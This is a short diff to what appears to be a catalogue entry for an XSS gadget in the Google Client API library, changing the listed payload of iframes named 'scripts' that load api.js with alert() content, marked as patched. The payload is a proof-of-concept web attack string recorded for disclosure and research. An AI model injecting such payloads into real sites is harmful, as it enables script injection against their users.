@@ -5,7 +5,7 @@
 + Library: Google Client API
 + Starts: N/A
 + Version: 5BIk7BglYEE
-+ Payload: ```<iframe name="scripts" src=”https://apis.google.com/js/api.js”>alert("GG!")</iframe><iframe name="scripts" src=”https://apis.google.com/js/api.js”>alert("GG!")</iframe>```
++ Payload: ```<iframe name="scripts" src=”https://apis.google.com/js/api.js”></iframe><iframe name="scripts" src=”https://apis.google.com/js/api.js”>alert(1)</iframe>```
 + Impact: XSS
 + CVE: N/A
 + Status: Patched
